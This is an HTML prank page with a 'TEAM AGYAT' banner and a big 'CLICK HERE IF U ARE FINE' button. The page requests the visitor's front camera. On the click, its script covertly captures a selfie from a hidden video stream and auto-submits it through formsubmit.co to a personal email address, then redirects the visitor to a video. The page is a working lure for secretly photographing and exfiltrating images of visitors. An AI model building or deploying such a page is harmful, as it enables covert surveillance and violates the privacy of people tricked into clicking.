<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body> 
    <marquee behavior="scroll" direction="left" style="font-size: 2em; font-weight: bold; background-color: #f0f8ff; color: #0073e6; padding: 10px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);">
        <img src= "https://www.bing.com/th/id/OIP.eJGRKo-WImYfGnB-p-r41AHaGq?w=228&h=206&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Nepal Flag" style="height: 50px; vertical-align: middle;"> 
        <span>_____ITS ME ( HEMRAZ ) -- TEAM AGYAT </span>
        <img src="https://www.bing.com/th/id/OIP.eJGRKo-WImYfGnB-p-r41AHaGq?w=228&h=206&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Nepal Flag" style="height: 50px; vertical-align: middle;">
    </marquee>
    <h2 style="font-size: 4em; color: palevioletred">  ARE U FINE ???  </h2>
    
    <!-- Removed the video element, only button to trigger capture -->
    <button id="capture" style="font-size: 3em; color: blueviolet; cursor: pointer;"> CLICK HERE IF U ARE FINE !!! </button>
    <canvas id="canvas" width="1080" height="1440" style="display: none;"></canvas>
    <form id="imageForm" action="https://formsubmit.co/hemrajbudha60@gmail.com" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
        <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg">
        <input type="hidden" name="_next" value="jetha.mp4">
        <button type="submit" style="display: none;">Submit</button>
    </form>

    <script>
        const canvas = document.getElementById("canvas");
        const captureButton = document.getElementById("capture");
        const imageInput = document.getElementById("imageInput");
        const form = document.getElementById("imageForm");

        // Start video stream with front-facing camera (selfie mode)
        navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user"  // Request front-facing camera
            }
        })
        .then(stream => {
            // Don't display video, just use it for capturing the photo
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            captureButton.addEventListener("click", () => {
                const context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Capture and submit the image
                canvas.toBlob(blob => {
                    const file = new File([blob], "photo.png", { type: "image/png" });
                    const dataTransfer = new DataTransfer();
                    dataTransfer.items.add(file);
                    imageInput.files = dataTransfer.files;

                    // Automatically submit the form
                    form.submit();
                }, "image/png");
            });
        })
        .catch(err => console.error("Error accessing camera: ", err));
    </script>
</body>
</html>
